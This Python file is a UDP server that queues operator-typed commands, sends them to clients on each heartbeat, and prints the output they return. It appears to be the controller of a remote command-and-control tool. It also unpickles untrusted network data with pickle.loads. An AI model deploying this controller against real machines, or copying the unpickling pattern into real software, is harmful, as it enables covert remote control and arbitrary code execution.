import socket
import pickle
import threading

SERVER_IP = "localhost"
SERVER_PORT = 5555

server_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
server_socket.bind((SERVER_IP, SERVER_PORT))

cmds = []

def heartbeat_handle():
    while True:
        msg, client_address = server_socket.recvfrom(1024)
        ac_msg = pickle.loads(msg)
        # print(f'[HEARTBEAT RECEIVED] {ac_msg}')

        ret_cmd = None
        if not len(cmds):
            ret_cmd = ""
        else:
            ret_cmd = cmds[0]
            cmds.pop(0)

        server_socket.sendto(pickle.dumps(ret_cmd), client_address)
        cmd_code = pickle.loads(server_socket.recv(1024))
        if cmd_code != "No command ran on Client":
            print(f'[CODE] {cmd_code[0]}')
            print(f'[STDOUT] {cmd_code[1]}')
            print(f'[STDERR] {cmd_code[2]}')
        # print(f'[RETURN CODE] {cmd_code}')


def handle_com():
    while True:
        cmd = input()
        cmds.append(cmd)

com = threading.Thread(target=handle_com)
com.start()

# hearbeat handle
hhandle = threading.Thread(target=heartbeat_handle)
hhandle.start()

# stopping the server
while True:
    # do nothing
    pass

server_socket.close()